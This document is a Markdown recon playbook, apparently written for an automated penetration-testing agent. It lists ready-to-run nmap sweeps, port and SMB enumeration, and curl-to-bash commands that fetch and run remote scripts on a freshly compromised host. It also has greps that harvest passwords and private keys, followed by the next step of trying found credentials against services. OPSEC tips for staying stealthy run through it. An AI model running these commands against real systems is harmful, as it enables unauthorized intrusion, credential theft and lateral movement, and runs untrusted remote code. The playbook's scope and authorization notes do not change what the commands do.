# 01 — Recon

> Authorized use only. Verify target ∈ `COBRA_ALLOWED_SCOPE` before scanning.

---

## §host-discovery — Find live hosts

**ARP discovery (local LAN only, most reliable on-segment):**
```bash
nmap -n -sn -PR -oG - 192.168.0.1/24
```

**ICMP discovery:**
```bash
nmap -n -sn -PI -oG - 192.168.0.1/24
```

**ICMP sweep without nmap (root, parallel):**
```bash
NET="10.11.0"  # discovers 10.11.0.1-254
seq 1 254 | xargs -P20 -I{} ping -n -c3 -i0.2 -w1 -W200 "${NET:-192.168.0}.{}" \
  | grep 'bytes from' | awk '{print $4" "$7;}' | sort -uV -k1,1
```

**Expected output:** list of live IPs. Feed into port scanning.
**OPSEC:** ARP is quiet on-segment; ICMP sweeps are noisy and logged by IDS.

---

## §port-scanning — Find open ports

**Fast top-ports scan:**
```bash
nmap -n -Pn -sCV -F --open --min-rate 10000 <target>
```

**Full TCP port scan:**
```bash
nmap -n -Pn -p- --open -T4 --min-rate 10000 -oG - <target>
```

**Targeted port list against many hosts:**
```bash
_scan_single() {
    local opt=("${2}")
    [ -f "$2" ] && opt=("-iL" "$2")
    nmap -Pn -p"${1}" --open -T4 -n -oG - "${opt[@]}" 2>/dev/null | grep -F Ports
}
scan() { local port="${1:?}"; shift; for ip in "$@"; do _scan_single "$port" "$ip"; done; }
# scan 22,80,443 192.168.0.1
# scan - 192.168.0.1-254 10.0.0.1-254
```

**Single-port bash check (no tools):**
```bash
timeout 5 bash -c "</dev/tcp/1.2.3.4/31337" && echo OPEN || echo CLOSED
```

**OPSEC:** `--min-rate 10000` is fast but very loud. Drop to `-T3` / lower rate for stealth.
**Fallback:** if nmap missing, use the bash `/dev/tcp` check in a loop.

---

## §service-enum — Versions & vulns

**Service/version detection:**
```bash
nmap -n -Pn -sCV -p<ports> --open <target>
```

**Vulnerability scan (slow, noisy — flag before running):**
```bash
nmap -A -F -Pn --min-rate 10000 --script vulners.nse --script-timeout=5s <target>
```

**SMB enumeration:**
```bash
nmap -n -Pn -p445 --script smb-os-discovery,smb-enum-shares,smb-enum-users <target>
```

**Expected output:** service banners, versions, OS guess, script findings.
**Next move:** feed versions into `exploit_search` / `07-creds.md` for default creds.

---

## §host-profile — Profile a host you just landed on

**Automated (whatserver):**
```bash
bash -c "$(curl -fsSL https://thc.org/ws)"
```

**netstat when netstat/ss/lsof are missing:**
```bash
curl -fsSL https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/tools/awk_netstat.sh | bash
```

**Speed/bench check:**
```bash
curl -fsSL https://bench.sh | bash
```

**OPSEC:** these pull from the internet — requires `COBRA_ALLOW_INTERNET=1` and burns OPSEC on a watched host. Prefer local enumeration when stealth matters.

---

## §password-grep — Find creds in files

**Passwords (low-noise):**
```bash
grep -HEronasi '.{,16}password.{,64}' .
```

**TLS / OpenSSH private keys:**
```bash
grep -r -F -- " PRIVATE KEY-----" .
```

**Dedicated scanners (better, needs download):**
```bash
# noseyparker (static binary)
curl -o np -fsSL https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static
chmod 700 np && ./np scan . && ./np report --color=always | less -R
```

**Find subdomains/emails in files:**
```bash
resolv() { while read -r x; do r="$(getent hosts "$x")" || continue; echo "${r%% *}"$'\t'"${x}"; done; }
find_subdomains() {
	local d="${1//./\\.}"
	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
	[ $# -le 0 ] && { echo -en >&2 "Usage: find_subdomains <apex-domain> <file>\n"; return; }
	shift 1; [ $# -le 0 ] && [ -t 0 ] && set -- .
	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
}
# find_subdomains .foobar.com | anew | resolv
```

**Next move:** validate found creds → record in brain `Credentials` → try against services.
